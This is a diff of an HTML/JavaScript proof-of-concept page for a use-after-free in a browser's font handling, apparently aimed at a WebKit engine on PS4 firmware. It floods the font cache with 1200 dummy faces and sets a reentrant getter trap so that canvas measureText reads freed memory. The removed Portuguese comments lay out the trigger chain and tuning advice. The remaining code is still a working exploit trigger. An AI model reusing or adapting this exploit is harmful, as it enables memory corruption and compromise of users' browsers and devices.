@@ -6,20 +6,6 @@
 <body>
 <pre id="log">Carregando Ahem.woff...</pre>
 <script>
-// UAF HIBRIDO v2 — FontMetrics reference + getter trap
-// Correcao da v1: usa WOFF valido (Ahem.woff) em vez de base64 invalido.
-//
-// POR QUE A v1 FALHOU:
-//   A base64 curta/invalida (d09GRgABAAAAAAA) causa rejeicao de FontFace.loaded.
-//   O mecanismo de thenable-check (acesso a .then) ocorre APENAS no caminho de
-//   fulfillment da promise, nao no de rejecao. O getter trap nunca disparou.
-//
-// CORRECAO:
-//   Usar Ahem.woff real (mesmo da PoC que causou crash).
-//   Ahem.woff e pequeno o suficiente para o pre-warm de opportunistically
-//   StartFontDataURLLoading() e resolve FontFace.loaded com sucesso.
-//
-// REQUER: Ahem.woff no mesmo diretorio (mesmo arquivo ja usado).
 
 function log(msg) { document.getElementById('log').textContent = msg; }
 
@@ -42,18 +28,6 @@ function loadFontAsDataURL(path) {
 loadFontAsDataURL('resources/Ahem.woff')
     .then(function(dataUrl) {
         log('Ahem.woff carregado. Criando dummies...');
-
-        // -------------------------------------------------------------------
-        // Passo 1: popular o FontCascadeCache (1200 entradas)
-        //
-        // pruneUnreferencedEntries() precisa disparar DENTRO de width(),
-        // durante a reentrada do getter. Com >1000 entradas no cache,
-        // o limiar e cruzado quando o getter faz FontFaceSet.add() ->
-        // invalidacao -> FontCascadeCache::get() -> pruneUnreferencedEntries()
-        // -> FontCascadeFonts destruido -> &fontMetrics DANGLING.
-        //
-        // Se resultado for FAIL novamente: aumentar para 2000 ou 3000.
-        // -------------------------------------------------------------------
         var N_DUMMIES = 1200;
         var dummies = [];
         for (var i = 0; i < N_DUMMIES; i++) {
@@ -69,25 +43,10 @@ loadFontAsDataURL('resources/Ahem.woff')
         var keepAlive  = [];
 
         for (var attempt = 0; attempt < 2; attempt++) {
-
-            // metricsDonor: sem unicode-range → primaryFont da cascata
-            // measureTextInternal() usa ESTE face para:
-            //   auto& fontMetrics = fontProxy->metricsOfPrimaryFont()
-            // Se o FontCascadeFonts deste face for liberado durante width(),
-            // fontMetrics fica dangling.
             var metricsDonor = new FontFace(
                 'metricsDonor' + attempt,
                 'url("' + dataUrl + '")'
-                // sem unicodeRange → cobre tudo, incluindo U+0020 (primaryFont)
             );
-
-            // measured: unicode-range U+13A0-13FF → Cherokee exclusivo
-            // Durante o glyph walk de width() para '\u13A0\u13A2\u13A4',
-            // a engine pre-aquece AMBAS as fontes da cascata via
-            // opportunisticallyStartFontDataURLLoading() — incluindo measured.
-            // O WOFF valido completa sincronamente (confirmado no PS4 FW 14.00).
-            // FontFace.loaded e FULFILLADO → thenable-check acessa .then
-            // → getter trap dispara → reentrada → FontCascadeFonts liberado.
             var measured = new FontFace(
                 'measured' + attempt,
                 'url("' + dataUrl + '")',
@@ -97,25 +56,11 @@ loadFontAsDataURL('resources/Ahem.woff')
             document.fonts.add(metricsDonor);
             document.fonts.add(measured);
 
-            // Popula deferred promises para que fulfillment seja observavel
+            
             void metricsDonor.loaded;
             void measured.loaded;
 
-            // -------------------------------------------------------------------
-            // Getter trap — mecanismo do commit 42b1e2a
-            //
-            // Quando opportunisticallyStartFontDataURLLoading() completa:
-            //   font carrega sincronamente → FontFace.loaded fulfillado
-            //   engine testa: o valor resolvido e thenable?
-            //   acessa face.then → getter abaixo dispara
-            //
-            // Efeito:
-            //   document.fonts.add() → CSSFontFaceSet::add()
-            //   → font selector invalidation → FontCascade re-keyed
-            //   → FontCascadeFonts anterior perde refs externas
-            //   → pruneUnreferencedEntries() (>1000 dummies) → DESTRUIDO
-            //   → &fontMetrics DANGLING dentro de measureTextInternal()
-            // -------------------------------------------------------------------
+            
             var reenterFontFaceSet = function() {
                 document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
             };
@@ -132,25 +77,7 @@ loadFontAsDataURL('resources/Ahem.woff')
             context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
             keepAlive.push(metricsDonor, measured, context);
 
-            // -------------------------------------------------------------------
-            // measureText dispara a sequencia vulneravel:
-            //
-            //   (A) fontMetrics = metricsOfPrimaryFont()  ← bind ANTES de width()
-            //
-            //   (B) fontProxy->width('\u13A0\u13A2\u13A4')
-            //         → FontCascadeFonts::glyphDataForVariant()
-            //           → opportunisticallyStartFontDataURLLoading()
-            //               WOFF valido → carrega SINCRONAMENTE
-            //               FontFace.loaded FULFILLADO → thenable-check
-            //               → getter dispara → FontFaceSet.add()
-            //               → invalidacao → pruneUnreferencedEntries()
-            //               → FontCascadeFonts DESTRUIDO
-            //               → &fontMetrics DANGLING
-            //
-            //   (C) emHeightAscentAndDescent(fontMetrics)  ← UAF read
-            //   (D) metrics.setActualBoundingBoxAscent(...) ← UAF reads
-            //       → valores de heap corrompido retornados via TextMetrics
-            // -------------------------------------------------------------------
+            
             var metrics = context.measureText('\u13A0\u13A2\u13A4');
 
             metricsLog.push({
@@ -165,23 +92,6 @@ loadFontAsDataURL('resources/Ahem.woff')
             });
         }
 
-        // -------------------------------------------------------------------
-        // Diagnostico
-        //
-        // PASS (UAF acionado):
-        //   a) crash antes desta mensagem aparecer
-        //   b) NaN, Infinity, numeros negativos ou absurdos em qualquer campo
-        //   c) valores DIFERENTES entre attempt 0 e 1 (heap layout variou)
-        //   d) ascent ou descent = 0 quando era esperado ~8-11
-        //
-        // FAIL (UAF nao acionado — pruneUnreferencedEntries nao disparou):
-        //   valores normais e identicos: ascent ~8-11, descent ~0-2
-        //   → aumentar N_DUMMIES para 2500 e testar novamente
-        //
-        // NOTA: UAF reads podem nao crashar imediatamente se a pagina de heap
-        //   ainda esta mapeada com outro objeto. Os valores garbage de TextMetrics
-        //   sao a evidencia — comparar os dois attempts.
-        // -------------------------------------------------------------------
         var out = '';
         for (var k = 0; k < metricsLog.length; k++) {
             var m = metricsLog[k];
